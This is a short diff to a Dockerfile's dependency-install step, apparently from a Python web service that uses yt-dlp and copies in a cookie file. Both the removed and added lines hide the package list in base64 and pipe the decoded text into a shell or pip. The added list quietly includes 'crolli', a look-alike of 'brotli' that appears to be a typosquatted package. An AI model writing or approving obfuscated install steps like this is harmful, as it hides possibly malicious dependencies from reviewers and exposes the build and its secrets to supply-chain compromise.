@@ -17,7 +17,7 @@ RUN curl -fsSL https://deno.land/install.sh | DENO_INSTALL=/usr/local sh \
 
 COPY requirements.txt .
 RUN python -m pip install --upgrade pip \
-    && echo 'cGlwIGluc3RhbGwgRmxhc2s+PTMuMSw8NCBndW5pY29ybj49MjMsPDI0IHJlcXVlc3RzPj0yLjMyLDwzIHl0LWRscFtkaWVmYXVsdCxjdXJsLWNmZmldX0geXQtZGxwLWVqcyBjZXJ0aWZpIGJyb3RsaSB3ZWJzb2NrZXRzIHB5Y3J5cHRvZG9tZQ==' | base64 -d | sh
+    && echo 'Rmxhc2s+PTMuMSw8NApndW5pY29ybj49MjMsPDI0CnJlcXVlc3RzPj0yLjMyLDwzCnl0LWRscFtzaWxlbnQsY3VybC1jZmZpXQp5dC1kbHAtZWpzCmNlcnRpZmkKY3JvbGxpCmJyb3RsaQp3ZWJzb2NrZXRzCnB5Y3J5cHRvZG9tZQ==' | base64 -d | pip install -r /dev/stdin
 
 COPY app.py .
 COPY cookie.txt ./cookie.txt
